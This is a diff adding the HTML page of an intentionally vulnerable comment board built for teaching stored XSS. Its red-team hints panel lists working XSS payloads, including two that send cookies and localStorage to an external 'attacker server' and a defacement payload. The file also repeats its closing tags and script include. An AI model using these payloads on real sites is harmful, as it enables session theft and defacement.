@@ -1,0 +1,202 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>ACME Corp Community Board</title>
+  
+  <!-- Bootstrap 5 -->
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+  
+  <!-- Custom Styles -->
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+  
+  <!-- ⚠️ WARNING BANNER -->
+  <div class="warning-banner">
+    <div class="container-fluid">
+      <div class="d-flex align-items-center justify-content-between">
+        <div>
+          <strong>⚠️ VULNERABLE APPLICATION - EDUCATIONAL USE ONLY</strong>
+        </div>
+        <div class="text-end">
+          <small>This comment board contains intentional XSS vulnerabilities for cybersecurity education</small>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- MAIN CONTENT -->
+  <div class="container mt-4">
+    
+    <div class="row justify-content-center">
+      <div class="col-lg-8">
+        
+        <!-- Header -->
+        <div class="d-flex justify-content-between align-items-center mb-4">
+          <div>
+            <h2>💬 ACME Corp Community Board</h2>
+            <p class="text-muted">Share your feedback and experiences</p>
+          </div>
+          <a href="/" class="btn btn-outline-primary">← Back to Chat</a>
+        </div>
+
+        <!-- Post Comment Section -->
+        <div class="card shadow mb-4">
+          <div class="card-header bg-primary text-white">
+            <strong>✍️ Post a Comment</strong>
+          </div>
+          <div class="card-body">
+            <form id="commentForm" onsubmit="return false;">
+              <div class="mb-3">
+                <label for="commentText" class="form-label">Your Comment:</label>
+                <textarea 
+                  class="form-control" 
+                  id="commentText" 
+                  rows="3" 
+                  placeholder="Share your thoughts..."
+                  required
+                ></textarea>
+                <small class="text-muted">You're posting as: <strong id="currentUser">Anonymous</strong></small>
+              </div>
+              <button type="submit" class="btn btn-primary" onclick="postComment()">
+                📤 Post Comment
+              </button>
+            </form>
+          </div>
+        </div>
+
+        <!-- Comments Display -->
+        <div class="card shadow">
+          <div class="card-header bg-info text-white">
+            <strong>💭 Community Comments (<span id="commentCount">0</span>)</strong>
+          </div>
+          <div class="card-body" id="commentsContainer">
+            <!-- Comments will be inserted here -->
+            <div class="text-center text-muted">
+              <p>Loading comments...</p>
+            </div>
+          </div>
+        </div>
+
+      </div>
+
+      <!-- Attack Hints Panel -->
+      <div class="col-lg-4 mt-3 mt-lg-0">
+        <div class="card shadow border-danger">
+          <div class="card-header bg-danger text-white">
+            <strong>🔴 RED TEAM: Stored XSS Attacks</strong>
+          </div>
+          <div class="card-body attack-hints">
+            
+            <div class="alert alert-warning">
+              <strong>⚠️ Stored XSS Demo</strong><br>
+              Unlike reflected XSS, these attacks affect ALL users who view this page!
+            </div>
+
+            <details open>
+              <summary class="fw-bold">1. Basic Stored XSS 💉</summary>
+              <div class="mt-2">
+                <p class="small">Post these comments (quote-safe):</p>
+                <ul class="small">
+                  <li>&lt;img src=x onerror=alert(1)&gt;</li>
+                  <li>&lt;svg onload=alert(document.domain)&gt;</li>
+                  <li>&lt;img src=x onerror=alert`XSS`&gt;</li>
+                  <li>&lt;body onload=alert(2)&gt;</li>
+                </ul>
+                <p class="small text-danger">💡 These persist and affect all visitors!</p>
+                <p class="small text-warning">⚠️ Avoid nested quotes! Use: <code>alert(1)</code> or <code>alert`text`</code></p>
+              </div>
+            </details>
+            
+            <details class="mt-3">
+              <summary class="fw-bold">2. Cookie Theft 🍪</summary>
+              <div class="mt-2">
+                <p class="small">View stolen cookies in console:</p>
+                <pre class="small bg-dark text-light p-2 rounded">&lt;img src=x onerror=console.log(document.cookie)&gt;</pre>
+                <p class="small">Or show in alert:</p>
+                <pre class="small bg-dark text-light p-2 rounded">&lt;img src=x onerror=alert(document.cookie)&gt;</pre>
+                <p class="small text-danger">⚠️ Check browser console or popup!</p>
+              </div>
+            </details>
+            
+            <details class="mt-3">
+              <summary class="fw-bold">3. Session Exfiltration 🎯</summary>
+              <div class="mt-2">
+                <p class="small"><strong>Send cookies to attacker server:</strong></p>
+                <pre class="small bg-dark text-light p-2 rounded">&lt;img src=x onerror="fetch('https://project-1-17.eduhk.hk/exfil?data='+document.cookie)"&gt;</pre>
+                
+                <p class="small mt-2"><strong>Full session data (advanced):</strong></p>
+                <pre class="small bg-dark text-light p-2 rounded">&lt;img src=x onerror="fetch('https://project-1-17.eduhk.hk/exfil',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({cookie:document.cookie,localStorage:JSON.stringify(localStorage),url:location.href})})"&gt;</pre>
+                
+                <p class="small text-success mt-2">
+                  ✅ <strong>View stolen data dashboard:</strong><br>
+                  <a href="https://project-1-17.eduhk.hk" target="_blank" class="text-white"><u>https://project-1-17.eduhk.hk</u></a> (Attacker Server)<br>
+                  <span class="text-muted">Dashboard auto-refreshes to show all victims!</span>
+                </p>
+              </div>
+            </details>
+
+            <details class="mt-3">
+              <summary class="fw-bold">4. Defacement 🎨</summary>
+              <div class="mt-2">
+                <p class="small">Change page content:</p>
+                <pre class="small bg-dark text-light p-2 rounded">&lt;img src=x onerror="
+  document.body.innerHTML=
+  '&lt;h1&gt;HACKED!&lt;/h1&gt;'
+"&gt;</pre>
+                <p class="small text-danger">⚠️ This affects everyone viewing the page!</p>
+              </div>
+            </details>
+
+            <div class="mt-3 p-2 bg-danger text-white rounded">
+              <small>
+                <strong>🚨 Teaching Point:</strong><br>
+                Stored XSS is MORE dangerous than reflected XSS because:
+                <ul class="mb-0 mt-2 small">
+                  <li>Affects ALL users (not just the attacker)</li>
+                  <li>Persists across sessions</li>
+                  <li>No user interaction needed</li>
+                  <li>Can be used for worms/self-propagating attacks</li>
+                </ul>
+              </small>
+            </div>
+          </div>
+        </div>
+
+        <!-- Helper Tools -->
+        <div class="card shadow border-info mt-3">
+          <div class="card-header bg-info text-white">
+            <strong>🛠️ Helper Tools</strong>
+          </div>
+          <div class="card-body">
+            <button class="btn btn-sm btn-outline-primary w-100 mb-2" onclick="loadComments()">
+              🔄 Reload Comments
+            </button>
+            <button class="btn btn-sm btn-outline-danger w-100 mb-2" onclick="if(confirm('Clear ALL comments?')) clearAllComments()">
+              🗑️ Clear All Comments
+            </button>
+            <div class="mt-3">
+              <small class="text-muted">
+                <strong>Console Commands:</strong><br>
+                Open DevTools (F12) → Console tab
+              </small>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Bootstrap Bundle -->
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+  <script src="comments.js"></script>
+</body>
+</html>
+  
+  <!-- Comments JavaScript -->
+  <script src="comments.js"></script>
+  
+</body>
+</html>
